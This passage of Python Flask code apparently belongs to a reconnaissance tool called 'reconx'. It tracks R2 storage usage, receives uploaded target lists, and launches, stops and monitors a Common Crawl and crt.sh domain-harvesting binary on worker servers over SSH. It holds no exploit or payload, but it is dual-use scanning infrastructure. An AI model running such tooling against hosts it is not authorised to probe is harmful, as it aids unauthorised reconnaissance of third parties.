
    Runs once per monitor cycle (30 s) so a thousand-object bucket adds
    one paginated list_objects_v2 round-trip every half minute — cheap.
    Cached on SSHManager so per-request reads are free."""
    bytes_by = {'warc': 0, 'uploads': 0, 'hits': 0, 'other': 0}
    count_by = {'warc': 0, 'uploads': 0, 'hits': 0, 'other': 0}
    total = 0
    try:
        token = None
        while True:
            kwargs = {'Bucket': bucket, 'MaxKeys': 1000}
            if token:
                kwargs['ContinuationToken'] = token
            resp = client.list_objects_v2(**kwargs)
            for o in resp.get('Contents', []) or []:
                k = o.get('Key', '')
                sz = int(o.get('Size', 0) or 0)
                total += sz
                if k.startswith('warc/'):
                    bytes_by['warc'] += sz; count_by['warc'] += 1
                elif k.startswith('uploads/'):
                    bytes_by['uploads'] += sz; count_by['uploads'] += 1
                elif k.startswith('hits/'):
                    bytes_by['hits'] += sz; count_by['hits'] += 1
                else:
                    bytes_by['other'] += sz; count_by['other'] += 1
            if not resp.get('IsTruncated'):
                break
            token = resp.get('NextContinuationToken')
            if not token:
                break
    except Exception as e:
        return {'error': str(e), 'total_bytes': 0,
                'bytes_by': bytes_by, 'count_by': count_by}
    # Counted-toward-cap = everything except hits, per operator policy.
    counted = total - bytes_by['hits']
    pct = (counted / R2_USAGE_LIMIT_BYTES * 100) if R2_USAGE_LIMIT_BYTES else 0
    return {
        'error': None,
        'total_bytes': total,
        'counted_bytes': counted,
        'bytes_by': bytes_by,
        'count_by': count_by,
        'limit_bytes': R2_USAGE_LIMIT_BYTES,
        'percent': round(pct, 2),
        # Thresholds operators care about: 75% (info toast) and 95% (warn).
        'threshold_75_hit': counted >= R2_USAGE_LIMIT_BYTES * 0.75,
        'threshold_95_hit': counted >= R2_USAGE_LIMIT_BYTES * 0.95,
    }


def _r2_health_probe() -> dict:
    """Run by SSHManager.monitor_thread each cycle. Calls
    _get_r2_client() and (when connected) verifies bucket reachability
    via head_bucket plus inventories usage. Returns the dict shape the
    SSH manager cache expects."""
    client, bucket, state, err = _get_r2_client()
    if state != 'connected' or client is None or not bucket:
        return {'state': state, 'last_error': err, 'usage': None}
    try:
        client.head_bucket(Bucket=bucket)
    except Exception as e:
        return {'state': 'unreachable', 'last_error': f'head_bucket failed: {e}', 'usage': None}
    usage = _r2_usage_breakdown(client, bucket)
    return {'state': 'connected', 'last_error': None, 'usage': usage}


@app.route('/api/upload/r2-config', methods=['GET', 'POST'])
def api_r2_config():
    """Read or write R2 credentials in config.json.

    On POST: if the secret_access_key field comes in blank, keep the
    previously-stored secret. The dashboard form intentionally clears
    that field on re-edit (it's a password input — we don't echo it
    back), so a naive overwrite would wipe credentials every time the
    user re-saved to change the bucket or account."""
    cfg = _load_scanner_config()
    if request.method == 'POST':
        data = request.get_json(force=True, silent=True) or {}
        existing = cfg.get(R2_CONFIG_KEY, {}) if isinstance(cfg.get(R2_CONFIG_KEY), dict) else {}
        new_secret = str(data.get('secret_access_key', '')).strip()
        cfg[R2_CONFIG_KEY] = {
            'account_id':       str(data.get('account_id', '')).strip(),
            'access_key_id':    str(data.get('access_key_id', '')).strip(),
            'secret_access_key': new_secret or str(existing.get('secret_access_key', '') or ''),
            'bucket_name':      str(data.get('bucket_name', '')).strip(),
        }
        with open(SCANNER_CONFIG_PATH, 'w') as f:
            json.dump(cfg, f, indent=2)
    r2 = cfg.get(R2_CONFIG_KEY, {})
    # Surface the cached health state from SSHManager so the dashboard
    # pill can show ● connected / misconfigured / unreachable without
    # blocking on a fresh head_bucket call per request.
    health = {'state': 'unknown', 'last_error': None, 'usage': None}
    mgr = get_ssh_manager()
    if mgr is not None:
        try:
            cached = mgr.get_r2_health() or {}
            health = {
                'state': cached.get('state', 'unknown'),
                'last_error': cached.get('last_error'),
                'usage': cached.get('usage'),
            }
        except Exception:
            pass
    return jsonify({
        'account_id':    r2.get('account_id', ''),
        'access_key_id': r2.get('access_key_id', ''),
        'secret_access_key': '●' * 8 if r2.get('secret_access_key') else '',
        'bucket_name':   r2.get('bucket_name', ''),
        'configured':    bool(r2.get('account_id') and r2.get('access_key_id') and r2.get('secret_access_key') and r2.get('bucket_name')),
        'state':         health['state'],
        'last_error':    health['last_error'],
        # Usage breakdown surfaced to the dashboard's R2Settings card and
        # the WarcPanel for the 75% / 95% threshold toasts. `null` until
        # the first successful health probe completes.
        'usage':         health['usage'],
    })


@app.route('/api/upload/presign', methods=['GET'])
def api_upload_presign():
    """Generate a pre-signed PUT URL for direct browser → R2 upload."""
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'error': err or f'R2 unavailable ({state})'}), 503
    import uuid as _uuid
    filename   = request.args.get('filename', 'targets.txt')
    upload_id  = _uuid.uuid4().hex
    key        = f'uploads/{upload_id}/{filename}'
    try:
        url = client.generate_presigned_url(
            'put_object',
            Params={'Bucket': bucket, 'Key': key, 'ContentType': 'text/plain'},
            ExpiresIn=7200,
        )
        return jsonify({'url': url, 'key': key, 'upload_id': upload_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/upload/complete', methods=['POST'])
def api_upload_complete():
    """Download the uploaded file from R2, save as targets.txt, return line count + preview."""
    client, bucket, state, err = _get_r2_client()
    if not client:
        return jsonify({'error': err or f'R2 unavailable ({state})'}), 503
    data     = request.get_json(force=True, silent=True) or {}
    key      = str(data.get('key', ''))
    filename = str(data.get('filename', 'targets.txt'))
    if not key:
        return jsonify({'error': 'key required'}), 400
    try:
        obj      = client.get_object(Bucket=bucket, Key=key)
        body     = obj['Body']
        count    = 0
        preview  = []
        with open('targets.txt', 'w', encoding='utf-8') as out:
            for raw_line in body.iter_lines():
                line = raw_line.decode('utf-8', errors='replace').strip()
                if line:
                    out.write(line + '\n')
                    count += 1
                    if len(preview) < 6:
                        preview.append(line)
        # Clean up from R2 after processing
        try:
            client.delete_object(Bucket=bucket, Key=key)
        except Exception:
            pass
        return jsonify({'success': True, 'targets': count, 'preview': preview, 'filename': filename})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ==================== WARC HARVEST (warc.go subprocess) ====================
#
# Manages a single long-running warc.go process. The binary writes
# live_domains.txt to a per-run temp dir on the controller; when the run
# finishes (or is stopped) the result is uploaded to R2 if R2 is
# configured, then the local tempdir is removed — so the controller
# isn't accumulating multi-MB harvest output between runs.

WARC_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
WARC_BINARY    = os.path.join(WARC_REPO_ROOT, 'reconx-warc')
WARC_SOURCE    = os.path.join(WARC_REPO_ROOT, 'warc.go')

_warc_lock = threading.Lock()
_warc_proc: 'subprocess.Popen | None' = None
_warc_state: dict = {
    'started_at': None,
    'finished_at': None,
    'pid': None,
    'run_id': None,
    'output_path': None,
    'log_path': None,
    'max_domains': None,
    'r2_key': None,
    'r2_uploaded_at': None,
    'r2_error': None,
    'last_exit_code': None,
    # Effect 1: where this run lives.
    #   'controller' → managed by local _warc_proc.Popen
    #   <ip>         → managed remotely; remote_pid holds the worker PID
    'run_on': 'controller',
    'remote_pid': None,
}

# Persisted snapshot of _warc_state so a gunicorn restart doesn't make the
# cockpit claim Idle while a remote harvest is still running on a worker.
# api_warc_status's existing kill -0 probe naturally re-syncs liveness once
# the dict is loaded.
WARC_STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'warc_state.json')


def _save_warc_state() -> None:
    """Persist _warc_state to disk (atomic). Caller need not hold the lock —
    json.dump on the dict reads it safely under CPython's GIL for plain types."""
    try:
        tmp = WARC_STATE_FILE + '.tmp'
        with open(tmp, 'w') as f:
            json.dump(_warc_state, f)
        os.replace(tmp, WARC_STATE_FILE)
        try: os.chmod(WARC_STATE_FILE, 0o600)
        except Exception: pass
    except Exception as e:
        print(f'[warc] state persist failed: {e}')


def _probe_remote_warc_pid(mgr, ip: str, pid: int) -> dict:
    """Read /proc/{pid} on the worker to recover process start time and
    max-domains arg. Used when adopting an orphan run (controller restart
    happened mid-harvest) so TARGET and STARTED are real, not "now"/None.

    Returns {'started_at': iso or None, 'max_domains': int or None}.
    Both fields are best-effort — a missing /proc entry just leaves them
    null and the cockpit shows "—" rather than misleading numbers."""
    if mgr is None or not pid:
        return {'started_at': None, 'max_domains': None}
    # `stat -c %Y /proc/{pid}` returns the dir's mtime, which Linux sets to
    # the process's wall-clock start time. `tr` collapses cmdline's nul
    # separators to spaces for trivial regex extraction.
    raw = mgr.ssh_exec(
        ip,
        f"echo STARTED=$(stat -c %Y /proc/{pid} 2>/dev/null || echo 0); "
        f"echo CMDLINE=$(tr '\\0' ' ' < /proc/{pid}/cmdline 2>/dev/null)",
        5,
    ) or ''
    started_at = None
    max_domains = None
    for ln in raw.splitlines():
        if ln.startswith('STARTED='):
            try:
                ts = int(ln[len('STARTED='):].strip())
                if ts > 0:
                    started_at = datetime.fromtimestamp(ts).isoformat()
            except ValueError:
                pass
        elif ln.startswith('CMDLINE='):
            cmd = ln[len('CMDLINE='):]
            m = re.search(r'-max-domains\s+(\d+)', cmd)
            if m:
                try: max_domains = int(m.group(1))
                except ValueError: pass
    return {'started_at': started_at, 'max_domains': max_domains}


def _load_warc_state() -> None:
    """Hydrate _warc_state from the sidecar at import time. Only known keys
    are copied so a malformed file can't smuggle stray fields into the dict."""
    try:
        if not os.path.exists(WARC_STATE_FILE):
            return
        with open(WARC_STATE_FILE, 'r') as f:
            loaded = json.load(f) or {}
        if isinstance(loaded, dict):
            for k in list(_warc_state.keys()):
                if k in loaded:
                    _warc_state[k] = loaded[k]
    except Exception as e:
        print(f'[warc] state load failed: {e}')


_warc_state_mtime: float = 0.0


def _truncate_log_tail(lines, max_lines: int = 20, max_chars: int = 400) -> list:
    """Belt-and-braces guard so /api/warc/status payloads stay small even
    when the cache fallback or a stale cache entry slips a giant entry
    through. warc.go writes progress with \\r so a single "line" returned
    by `tail -20` can balloon to ~16 KB once concatenated; without this
    the polled response was 195 KB, eating ~65 KB/s of dashboard bandwidth.
    Mirrors the cache writer's truncation in ssh_manager._refresh_warc_status_cache."""
    if not lines:
        return []
    out = []
    for ln in lines[-max_lines:]:
        s = str(ln)
        if len(s) > max_chars:
            s = s[: max_chars // 2] + ' …[truncated]… ' + s[-(max_chars // 2 - 20):]
        out.append(s)
    return out


def _reload_warc_state_if_changed() -> None:
    """Re-hydrate _warc_state when the sidecar's mtime has advanced. Gunicorn
    runs multiple workers with separate memory — without this, worker A can
    adopt an orphan PID and worker B's status endpoint still sees Idle."""
    global _warc_state_mtime
    try:
        if not os.path.exists(WARC_STATE_FILE):
            return
        mtime = os.path.getmtime(WARC_STATE_FILE)
        if mtime <= _warc_state_mtime:
            return
        _load_warc_state()
        _warc_state_mtime = mtime
    except Exception as e:
        print(f'[warc] state reload check failed: {e}')


_load_warc_state()
try:
    _warc_state_mtime = os.path.getmtime(WARC_STATE_FILE) if os.path.exists(WARC_STATE_FILE) else 0.0
except Exception:
    _warc_state_mtime = 0.0


def _validate_run_on(run_on: str) -> 'tuple[bool, str]':
    """Return (ok, normalized_or_err). run_on must be 'controller' or an
    IP currently in mgr.load_servers(). Anything else is a 400."""
    if not isinstance(run_on, str) or not run_on.strip():
        return False, "run_on must be 'controller' or a worker IP"
    val = run_on.strip()
    if val == 'controller':
        return True, 'controller'
    mgr = get_ssh_manager()
    roster = mgr.load_servers() if mgr is not None else []
    if val in roster:
        return True, val
    return False, f"run_on {val!r} is not in fleet roster"


def _ensure_warc_binary() -> 'tuple[bool, str]':
    """Return (ok, message). Existence-only check; the binary is built at
    install time (see install-controller.sh §7b) because the gunicorn
    service has no $PATH to /usr/bin/go."""
    if os.path.exists(WARC_BINARY) and os.access(WARC_BINARY, os.X_OK):
        return True, ''
    return False, (
        'reconx-warc binary missing — rebuild with: '
        'sudo -u reconx bash -c "WB=$(mktemp -d); cp /opt/reconx/warc.go $WB/; '
        'cd $WB && /usr/bin/go mod init reconx-warc && '
        '/usr/bin/go get github.com/schollz/progressbar/v3 && '
        '/usr/bin/go get golang.org/x/net/publicsuffix && '
        '/usr/bin/go mod tidy && '
        'GOOS=linux GOARCH=amd64 /usr/bin/go build -o /opt/reconx/reconx-warc warc.go; '
        'rm -rf $WB"'
    )


def _warc_watch_and_upload(proc: 'subprocess.Popen', snapshot: dict) -> None:
    """Wait for the warc process to exit, push the result to R2 (if
    configured), and clear the local run dir."""
    try:
        exit_code = proc.wait()
    except Exception as e:
        exit_code = -1
        print(f'[warc] wait failed: {e}')

    output_path = snapshot.get('output_path')
    run_id = snapshot.get('run_id')
    run_dir = os.path.dirname(output_path) if output_path else None

    r2_key = None
    r2_error = None
    if output_path and os.path.exists(output_path) and os.path.getsize(output_path) > 0:
        client, bucket, r2_state, r2_err = _get_r2_client()
        if client and bucket:
            try:
                ts = datetime.now().strftime('%Y%m%dT%H%M%SZ')
                r2_key = f'warc/live_domains_{ts}_{run_id}.txt'
                client.upload_file(output_path, bucket, r2_key, ExtraArgs={'ContentType': 'text/plain'})
            except Exception as e:
                r2_error = f'R2 upload failed: {e}'
                r2_key = None
        else:
            r2_error = r2_err or f'R2 unavailable ({r2_state})'

    with _warc_lock:
        _warc_state['finished_at'] = datetime.now().isoformat()
        _warc_state['last_exit_code'] = exit_code
        _warc_state['r2_key'] = r2_key
        _warc_state['r2_uploaded_at'] = datetime.now().isoformat() if r2_key else None
        _warc_state['r2_error'] = r2_error
    _save_warc_state()

    # Clean up local files only if we successfully shipped to R2; otherwise
    # leave them on disk so the operator can SCP them off manually.
    if r2_key and run_dir and os.path.isdir(run_dir):
        shutil.rmtree(run_dir, ignore_errors=True)


@app.route('/api/warc/start', methods=['POST'])
def api_warc_start():
    """Launch warc.go. Body (all optional):
       {max_domains, extract_workers, test_workers, verbose, run_on}

    run_on: 'controller' (default) → run as local subprocess on the bridge.
            <worker_ip>             → SFTP the binary and launch over SSH so
                                      the 300-goroutine harvest doesn't
                                      starve the controller serving the UI."""
    global _warc_proc
    _reload_warc_state_if_changed()
    with _warc_lock:
        if _warc_proc is not None and _warc_proc.poll() is None:
            return jsonify({'error': 'WARC already running', 'pid': _warc_proc.pid}), 409
        # Also block if a remote worker run is still flagged active.
        if _warc_state.get('run_on') not in (None, 'controller') and \
                _warc_state.get('finished_at') is None and \
                _warc_state.get('remote_pid') is not None:
            return jsonify({
                'error': 'WARC already running on worker',
                'run_on': _warc_state.get('run_on'),
                'remote_pid': _warc_state.get('remote_pid'),
            }), 409

    data = request.get_json(force=True, silent=True) or {}
    try:
        max_domains = max(1, int(data.get('max_domains') or 10000))
        extract_workers = max(1, int(data.get('extract_workers') or 200))
        test_workers = max(1, int(data.get('test_workers') or 100))
        # 0 = let warc.go auto-pick by max-domains; clamp to 1..20 to avoid
        # accidentally fanning out across the whole CC archive at once.
        snapshots = max(0, min(20, int(data.get('snapshots') or 0)))
    except (TypeError, ValueError):
        return jsonify({'error': 'invalid numeric option'}), 400
    verbose = bool(data.get('verbose'))

    # ── New flags: producer source + crt.sh pivots + subdomain filter ──
    # Default to legacy CC-only behavior if the caller omits 'source'.
    # Accept either a list (preferred) or a CSV string for tolerance.
    raw_source = data.get('source')
    if isinstance(raw_source, str):
        source_list = [s.strip().lower() for s in raw_source.split(',') if s.strip()]
    elif isinstance(raw_source, list):
        source_list = [str(s).strip().lower() for s in raw_source if str(s).strip()]
    else:
        source_list = []
    # Keep only known tokens; if the result is empty (or caller omitted
    # the field), fall back to legacy 'cc' so existing clients are
    # byte-identical to pre-change behavior.
    source_list = [s for s in source_list if s in ('cc', 'crtsh', 'crt.sh')]
    if not source_list:
        source_list = ['cc']
    crtsh_enabled = any(s in ('crtsh', 'crt.sh') for s in source_list)

    def _sanitize_csv(raw):
        if raw is None:
            return ''
        if isinstance(raw, list):
            parts = [str(p).strip() for p in raw]
        else:
            parts = [p.strip() for p in str(raw).split(',')]
        # Only allow conservative hostname chars — keeps shell-injection
        # off the table because the value gets interpolated into an SSH
        # command string downstream.
        safe = []
        for p in parts:
            if not p:
                continue
            if all(c.isalnum() or c in '.-_' for c in p):
                safe.append(p.lower())
        return ','.join(safe)

    crt_tld = _sanitize_csv(data.get('crt_tld'))
    crt_domain = _sanitize_csv(data.get('crt_domain'))
    if crtsh_enabled and not crt_tld and not crt_domain:
        return jsonify({
            'error': "source 'crtsh' requires at least one of crt_tld or crt_domain"
        }), 400
    subdomain_only = bool(data.get('subdomain_only'))

    run_on_raw = data.get('run_on', 'controller')
    ok_run, run_on = _validate_run_on(run_on_raw)
    if not ok_run:
        return jsonify({'error': run_on}), 400

    # The controller-side binary must exist either way: for the controller
    # path we exec it; for the worker path we SFTP it up.
    ok, err = _ensure_warc_binary()
    if not ok:
        return jsonify({'error': err}), 503

    run_id = uuid.uuid4().hex[:8]

    # ── Worker path ────────────────────────────────────────────────────
    if run_on != 'controller':
        ip = run_on
        mgr = get_ssh_manager()
        if mgr is None:
            return jsonify({'error': 'SSH manager unavailable'}), 503

        remote_dir    = '/root/python_job'
        remote_binary = f'{remote_dir}/reconx-warc'
        remote_output = f'{remote_dir}/live_domains.txt'
        remote_log    = f'{remote_dir}/warc.log'

        # Busy-binary guard. Without this, a second Start while an earlier
        # run is alive fails opaquely with ETXTBSY on the SFTP side and the
        # operator sees a generic 502. Match by COMM (process name) only —
        # pgrep -f would also catch the nohup wrapper bash whose cmdline
        # mentions 'reconx-warc', adopting the wrong PID.
        existing = mgr.ssh_exec(ip, 'pgrep -ax reconx-warc | head -1', 5).strip()
        if existing:
            tok = existing.split(None, 1)
            existing_pid = int(tok[0]) if tok and tok[0].isdigit() else None
            if existing_pid:
                # Recover real start time + max-domains from /proc/{pid}
                # so the cockpit shows accurate TARGET and STARTED instead
                # of "—" or a misleading "adopted just now".
                probed = _probe_remote_warc_pid(mgr, ip, existing_pid)
                # Adopt it into state so the cockpit reflects the truth even
                # if the previous controller restart wiped _warc_state. Clear
                # terminal fields too — without that, the auto-finalizer in
                # api_warc_status sees stale last_exit_code/r2_key from the
                # prior run and the UI looks like a paradox: running pid, but
                # also finished.
                with _warc_lock:
                    _warc_state.update({
                        'run_on': ip,
                        'remote_pid': existing_pid,
                        'output_path': remote_output,
                        'log_path': remote_log,
                        'started_at': probed['started_at']
                                       or _warc_state.get('started_at')
                                       or datetime.now().isoformat(),
                        'max_domains': probed['max_domains']
                                       or max_domains
                                       or _warc_state.get('max_domains'),
                        'finished_at': None,
                        'last_exit_code': None,
                        'r2_key': None,
                        'r2_uploaded_at': None,
                        'r2_error': None,
                    })
                _save_warc_state()
                return jsonify({
                    'error': f'WARC already running on {ip} (pid {existing_pid}) — '
                             f'Stop it first, or wait for the current run to finish.',
                    'run_on': ip, 'remote_pid': existing_pid,
                }), 409

        # SFTP's put() does not auto-create the parent directory — ensure
        # /root/python_job exists on the worker first, otherwise scp_upload
        # silently fails (its bare `except:` swallows the underlying
        # IOError) and the operator sees a useless 502. Also unlink any old
        # binary: if a previous run already exited but the file inode is
        # still referenced (cached), SFTP overwriting a busy executable
        # would otherwise raise ETXTBSY. rm-then-put gives the new binary
        # a fresh inode and leaves any running process untouched.
        mgr.ssh_exec(ip, f'mkdir -p {remote_dir} && rm -f {remote_binary}', 5)

        if not mgr.scp_upload(ip, WARC_BINARY, remote_binary):
            return jsonify({
                'error': (
                    f'SFTP of reconx-warc to {ip} failed. Common causes: '
                    f'(1) /opt/reconx/reconx-warc missing on controller — rebuild it; '
                    f'(2) worker SSH user lacks write access to {remote_dir}; '
                    f'(3) worker disk full.'
                )
            }), 502
        mgr.ssh_exec(ip, f'chmod +x {remote_binary}', 5)

        verbose_flag = ' -verbose' if verbose else ''
        snapshots_flag = f' -snapshots {snapshots}' if snapshots > 0 else ''
        # Source / crt.sh / subdomain flags only emitted when the caller
        # asked for something non-default — that keeps the legacy
        # CC-only command line byte-identical to pre-change baseline.
        source_flag = ''
        if source_list != ['cc']:
            source_flag = f" -source {','.join(source_list)}"
        crt_pivot_flag = ''
        if crtsh_enabled:
            if crt_tld:
                crt_pivot_flag += f' -crt-tld {crt_tld}'
            if crt_domain:
                crt_pivot_flag += f' -crt-domain {crt_domain}'
        subdomain_flag = ' -subdomain-only' if subdomain_only else ''
        # nohup + background + echo $! gets us the worker-side PID. The
        # `cd` keeps the binary's relative file lookups predictable.
        remote_cmd = (
            f"cd {remote_dir} && "
            f"nohup ./reconx-warc -max-domains {max_domains} "
            f"-output live_domains.txt "
            f"-extract-workers {extract_workers} "
            f"-test-workers {test_workers}{verbose_flag}{snapshots_flag}"
            f"{source_flag}{crt_pivot_flag}{subdomain_flag} "
            f"> warc.log 2>&1 & echo $!"
        )
        out = mgr.ssh_exec(ip, remote_cmd, 15)
        # Pull the first all-digit line — nohup may print a "[1] 12345" job
        # tag plus the echoed PID.
        remote_pid = None
        for ln in (out or '').splitlines():
            tok = ln.strip().split()
            for t in reversed(tok):
                if t.isdigit():
                    remote_pid = int(t)
                    break
            if remote_pid is not None:
                break
        if remote_pid is None:
            return jsonify({'error': f'remote spawn failed; ssh output: {out!r}'}), 502

        snapshot = {
            'started_at': datetime.now().isoformat(),
            'pid': None,
            'run_id': run_id,
            'output_path': remote_output,
            'log_path': remote_log,
            'max_domains': max_domains,
            'run_on': ip,
            'remote_pid': remote_pid,
        }
        with _warc_lock:
            _warc_proc = None  # no local process
            _warc_state.update(snapshot)
            _warc_state['finished_at'] = None
            _warc_state['r2_key'] = None
            _warc_state['r2_uploaded_at'] = None
            _warc_state['r2_error'] = None
            _warc_state['last_exit_code'] = None
        _save_warc_state()

        # Deliberately NOT spawning _warc_watch_and_upload — the worker
        # owns its output. api_warc_status detects the running→stopped
        # transition and triggers R2 export at that point.
        return jsonify({
            'success': True,
            'run_on': ip,
            'remote_pid': remote_pid,
            'run_id': run_id,
            'max_domains': max_domains,
        })

    # ── Controller path (legacy local Popen) ──────────────────────────
    run_dir = f'/tmp/reconx_warc_{run_id}'
    try:
        os.makedirs(run_dir, exist_ok=True)
    except OSError as e:
        return jsonify({'error': f'cannot create run dir: {e}'}), 500
    output_path = os.path.join(run_dir, 'live_domains.txt')
    log_path = os.path.join(run_dir, 'warc.log')

    cmd = [
        WARC_BINARY,
        '-max-domains', str(max_domains),
        '-output', output_path,
        '-extract-workers', str(extract_workers),
        '-test-workers', str(test_workers),
    ]
    if verbose:
        cmd.append('-verbose')
    if snapshots > 0:
        cmd.extend(['-snapshots', str(snapshots)])
    # Mirror the SSH path: only emit new flags when non-default so the
    # CC-only invocation is byte-identical to baseline.
    if source_list != ['cc']:
        cmd.extend(['-source', ','.join(source_list)])
    if crtsh_enabled:
        if crt_tld:
            cmd.extend(['-crt-tld', crt_tld])
        if crt_domain:
            cmd.extend(['-crt-domain', crt_domain])
    if subdomain_only:
        cmd.append('-subdomain-only')

    try:
        log_handle = open(log_path, 'wb')
        proc = subprocess.Popen(
            cmd,
            stdout=log_handle,
            stderr=subprocess.STDOUT,
            cwd=run_dir,
            start_new_session=True,
        )
    except Exception as e:
        return jsonify({'error': f'failed to spawn warc: {e}'}), 500

    snapshot = {
        'started_at': datetime.now().isoformat(),
        'pid': proc.pid,
        'run_id': run_id,
        'output_path': output_path,
        'log_path': log_path,
        'max_domains': max_domains,
        'run_on': 'controller',
        'remote_pid': None,
    }
    with _warc_lock:
        _warc_proc = proc
        _warc_state.update(snapshot)
        # Reset terminal state from any previous run
        _warc_state['finished_at'] = None
        _warc_state['r2_key'] = None
        _warc_state['r2_uploaded_at'] = None
        _warc_state['r2_error'] = None
        _warc_state['last_exit_code'] = None
    _save_warc_state()

    threading.Thread(target=_warc_watch_and_upload, args=(proc, dict(snapshot)), daemon=True).start()

    return jsonify({'success': True, 'pid': proc.pid, 'run_id': run_id, 'max_domains': max_domains})


@app.route('/api/warc/stop', methods=['POST'])
def api_warc_stop():
    global _warc_proc
    _reload_warc_state_if_changed()
    with _warc_lock:
        proc = _warc_proc
        run_on = _warc_state.get('run_on') or 'controller'
        remote_pid = _warc_state.get('remote_pid')

    # ── Worker path: SIGTERM via SSH, escalate to SIGKILL after 5s ────
    # Fire-and-forget: the kill+poll+escalate loop blocks for up to 6s.
    # That makes the UI's "Stop" button feel broken. Kick the work into a
    # background thread, return 202 immediately. The monitor cycle picks up
    # the dead PID on its next pass and `/api/warc/status` reflects it.
    if run_on != 'controller':
        if not remote_pid:
            return jsonify({'success': True, 'message': 'no warc running'})
        mgr = get_ssh_manager()
        if mgr is None:
            return jsonify({'error': 'SSH manager unavailable'}), 503
        ip = run_on

        def _async_stop(_ip: str, _pid: int) -> None:
            try:
                mgr.ssh_exec(_ip, f'kill {_pid}', 5)
                for _ in range(5):
                    time.sleep(1)
                    alive = mgr.ssh_exec(
                        _ip,
                        f"kill -0 {_pid} 2>/dev/null && echo alive || echo dead",
                        5,
                    )
                    if alive.strip() == 'dead':
                        return
                mgr.ssh_exec(_ip, f'kill -9 {_pid}', 5)
            except Exception as e:
                print(f'[warc] async stop failed for {_ip} pid {_pid}: {e}')

        threading.Thread(
            target=_async_stop, args=(ip, remote_pid),
            daemon=True, name=f'warc-stop-{ip}',
        ).start()
        return jsonify({
            'success': True, 'run_on': ip, 'remote_pid': remote_pid,
            'message': f'SIGTERM sent to pid {remote_pid}; will SIGKILL after 5s if it survives. Status will update on next monitor cycle.',
        }), 202

    # ── Controller path ───────────────────────────────────────────────
    if proc is None or proc.poll() is not None:
        return jsonify({'success': True, 'message': 'no warc running'})
    try:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    except Exception as e:
        return jsonify({'error': f'failed to stop: {e}'}), 500
    return jsonify({'success': True})


@app.route('/api/warc/status', methods=['GET'])
def api_warc_status():
    global _warc_proc
    _reload_warc_state_if_changed()
    with _warc_lock:
        proc = _warc_proc
        state = dict(_warc_state)

    run_on = state.get('run_on') or 'controller'
    output_path = state.get('output_path')
    log_path = state.get('log_path')
    domains_found = 0
    log_tail: list = []

    if run_on != 'controller':
        # ── Worker path: read from SSHManager cache, not inline SSH ─────
        # The monitor thread refreshes liveness + domain count + log tail
        # every ~30 s with one batched SSH call. Reading from RAM keeps
        # this endpoint under 200 ms p95 even during a live harvest, so
        # the dashboard's 6/6 startup check stops timing out.
        ip = run_on
        remote_pid = state.get('remote_pid')
        mgr = get_ssh_manager()
        running = False
        if mgr is not None and remote_pid:
            cached = None
            try:
                cached = mgr.get_warc_status_cache(ip)
            except Exception:
                cached = None

            # First-hit fallback: monitor hasn't filled the cache for this
            # worker yet (e.g., a fresh start just landed). Do one
            # synchronous probe so the operator doesn't see a blank
            # status for up to a full monitor cycle.
            if cached is None:
                alive_raw = mgr.ssh_exec(
                    ip,
                    f"kill -0 {remote_pid} 2>/dev/null && echo alive || echo dead",
                    5,
                )
                running = (alive_raw.strip() == 'alive')
                if output_path:
                    wc = mgr.ssh_exec(ip, f"wc -l < {output_path} 2>/dev/null || echo 0", 5)
                    try:
                        domains_found = int((wc or '0').strip().split()[0])
                    except (ValueError, IndexError):
                        domains_found = 0
                if log_path:
                    tail_out = mgr.ssh_exec(ip, f"tail -20 {log_path} 2>/dev/null", 8)
                    log_tail = [ln for ln in (tail_out or '').splitlines() if ln.strip()]
            else:
                # Cached snapshot — only trust the alive flag when the
                # cached PID matches what we have in state (so a stale
                # entry from a prior run doesn't claim alive after the
                # operator already started a new harvest).
                cached_pid = cached.get('remote_pid')
                if cached_pid and int(cached_pid) == int(remote_pid):
                    running = bool(cached.get('alive'))
                    domains_found = int(cached.get('domains_found') or 0)
                    log_tail = list(cached.get('log_tail') or [])
                else:
                    # PID divergence — fall back to a sync probe.
                    alive_raw = mgr.ssh_exec(
                        ip,
                        f"kill -0 {remote_pid} 2>/dev/null && echo alive || echo dead",
                        5,
                    )
                    running = (alive_raw.strip() == 'alive')
                    if output_path:
                        wc = mgr.ssh_exec(ip, f"wc -l < {output_path} 2>/dev/null || echo 0", 5)
                        try:
                            domains_found = int((wc or '0').strip().split()[0])
                        except (ValueError, IndexError):
                            domains_found = 0
                    if log_path:
                        tail_out = mgr.ssh_exec(ip, f"tail -20 {log_path} 2>/dev/null", 8)
                        log_tail = [ln for ln in (tail_out or '').splitlines() if ln.strip()]

            # Auto-heal: recorded PID is dead, but pgrep finds a live
            # reconx-warc on the worker. Adopt the real one instead of
            # flipping to finished. Covers the case where we adopted the
            # nohup wrapper bash (now exited) while the actual binary
            # keeps running, or where the operator launched warc manually
            # outside the dashboard. Still done synchronously because it
            # only runs on the cold/transitional path (not on every poll).
            if not running:
                hit = mgr.ssh_exec(ip, 'pgrep -ax reconx-warc | head -1', 5).strip()
                tok = hit.split(None, 1) if hit else []
                real_pid = int(tok[0]) if tok and tok[0].isdigit() else None
                if real_pid and real_pid != remote_pid:
                    probed = _probe_remote_warc_pid(mgr, ip, real_pid)
                    with _warc_lock:
                        _warc_state['remote_pid'] = real_pid
                        if probed['started_at']:
                            _warc_state['started_at'] = probed['started_at']
                        if probed['max_domains']:
                            _warc_state['max_domains'] = probed['max_domains']
                        _warc_state['finished_at'] = None
                        _warc_state['last_exit_code'] = None
                        state = dict(_warc_state)
                    _save_warc_state()
                    remote_pid = real_pid
                    running = True

        # Detect the running→stopped transition exactly once: stamp
        # finished_at + last_exit_code, then fire R2 export inline (the
        # worker pushes straight to R2 — controller never touches the file).
        if (not running) and state.get('finished_at') is None and remote_pid:
            r2_key_done = None
            r2_err_done = None
            try:
                # Compute sha first so the harvest-finished auto-export
                # also lands at the content-addressed key. Without this,
                # a deterministic harvest re-run would create a second
                # object that the dedup logic later tries to skip but
                # can't because the keys don't collide.
                _auto_sha = _sha256_remote(mgr, ip, output_path) if mgr else None
                r2_key_done, r2_err_done = _warc_remote_export_to_r2(
                    ip, output_path, state.get('run_id'), content_sha=_auto_sha,
                )
            except Exception as e:
                r2_err_done = f'remote R2 export failed: {e}'
